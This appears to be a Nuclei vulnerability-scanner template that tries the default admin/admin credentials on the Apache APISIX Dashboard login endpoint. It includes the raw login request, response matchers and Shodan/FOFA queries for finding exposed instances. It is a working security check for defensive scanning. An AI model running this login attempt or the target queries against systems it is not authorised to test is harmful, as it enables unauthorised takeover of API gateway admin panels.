id: apisix-default-login

info:
  name: Apache Apisix Admin - Default Login
  author: pdteam
  severity: high
  description: An Apache Apisix default admin login was discovered.
  reference:
    - https://apisix.apache.org/
  classification:
    cpe: cpe:2.3:a:apisix:apisix:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
    product: https://apisix.apache.org
    shodan-query: title:"Apache APISIX Dashboard"
    fofa-query: title="Apache APISIX Dashboard"
    vendor: apisix
  tags: apisix,apache,default-login,vuln

http:
  - raw:
      - |
        POST /apisix/admin/user/login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
        Authorization:
        Content-Type: application/json;charset=UTF-8

        {"username":"{{user}}","password":"{{pass}}"}

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        name: https://apisix.apache.org
        cpe: cpe:2.3:a:apisix:apisix:*:*:*:*:*:*:*:*
        part: body
        words:
          - '"data":'
          - '"token":'
          - '{"code":0'
        condition: and

      - type: word
        name: https://apisix.apache.org-2
        cpe: cpe:2.3:a:apisix:apisix:*:*:*:*:*:*:*:*
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
